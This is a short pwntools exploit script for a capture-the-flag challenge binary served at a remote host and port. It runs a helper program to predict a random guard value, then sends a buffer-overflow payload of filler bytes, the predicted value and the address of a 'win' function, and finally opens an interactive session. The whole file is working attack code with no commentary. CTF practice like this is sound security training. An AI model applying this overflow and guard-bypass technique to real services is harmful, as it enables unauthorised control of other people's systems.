#!/usr/bin/python3
from pwn import *
import subprocess
elf = context.binary = ELF("chal")

local = False 
if local:
    p = process("./chal")
    #gdb.attach(p,'''b*0x00000000004013a3\nc''')
else:
    p = remote('amt.rs', 31175)

elf = context.binary = ELF('./chal', checksec=False)
def recvuntil_without_last(p, delimiter):
    data = p.recvuntil(delimiter, drop=True)
    p.unrecv(delimiter)
    return data
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

proc = subprocess.Popen(['./get_rand'],stdout=subprocess.PIPE)
line = int(proc.stdout.readline(),10)
line2 = proc.stdout.readline()
info('Random:   '+hex(line))
info('Random2:  '+str(line2))
'''sleep(1)
proc = subprocess.Popen(['./get_rand'],stdout=subprocess.PIPE)
line = int(proc.stdout.readline(),10)
line2 = proc.stdout.readline()
info('Random:   '+hex(line))
info('Random2:  '+str(line2))
'''
canary = 0x00000000004040cc
win = 0x4012b6
sla(b'3) Exit', str(1))
sla(b'3) Exit', str(2))
payload = b'1'*(40+4)+p64(line) +b'1'*4 + p64(win)
sla(b'guess: ', payload)
p.interactive()